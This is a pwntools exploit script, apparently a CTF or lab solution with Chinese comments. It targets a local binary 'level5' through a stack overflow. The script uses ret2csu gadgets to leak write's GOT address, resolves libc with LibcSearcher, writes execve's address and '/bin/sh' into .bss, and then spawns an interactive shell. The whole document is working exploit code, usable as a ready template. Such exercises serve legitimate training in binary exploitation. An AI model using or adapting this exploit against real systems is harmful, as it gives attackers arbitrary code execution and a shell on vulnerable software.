from pwn import*
from LibcSearcher import*
context(arch='amd64', os='linux', log_level='debug')
p   = process('./level5')
elf = ELF('./level5')

write_got = elf.got['write']
read_got  = elf.got['read']
main      = elf.symbols['main']
bss_base  = elf.bss() # 写入execve和/bin/sh的地址

gadget1   = 0x400616
gadget2   = 0x400600

# 利用csu函数片段执行任意函数
# 64位参数使用的寄存器依次为 : rdi, rsi, rdx, rcx, r8, r9
def csu(rdi, rsi, rdx, fun, ret):
    payload  = b'a' * (0x80 + 8)
    # rdi rsi rdx
    payload += p64(gadget1)
    payload += p64(0) # add rsp, 8
    payload += p64(0) # rbx = 0
    payload += p64(1) # rbp = 1
    payload += p64(fun) # r12 = fun
    payload += p64(rdx) # r13 = rdx
    payload += p64(rsi) # r14 = rsi
    payload += p64(rdi) # r15d = edi = rdi(注意rdi只有后四个字节有效)
    payload += p64(gadget2) # 
    payload += b'\0' * (7 * 8) # add rsp, 8和填充6个pop
    payload += p64(ret)
    p.send(payload)

p.recvuntil('Hello, World\n')
csu(1, write_got, 8, write_got, main) # 获取got中的write地址

write    = u64(p.recv()[:8])
libc     = LibcSearcher('write', write)
libcBase = write    - libc.dump('write')
execve   = libcBase + libc.dump('execve')

# 在bss段写入execve的地址和/bin/sh
# 因为csu中调用函数使用的值是指针的值, 因此需要一个指向execve的指针
# 因为rdi修改的是edi的值, 因此不能使用libc中的/bin/sh, 只能将/bin/sh写入较低地址的bss段
csu(0, bss_base, len(p64(execve) + b'/bin/sh' + b'\0'), read_got, main)
p.send(p64(execve) + b'/bin/sh' + b'\0')

# 执行execve调用/bin/sh
p.recvuntil('Hello, World\n')
csu(bss_base + 8, 0, 0, bss_base, main)

p.interactive()
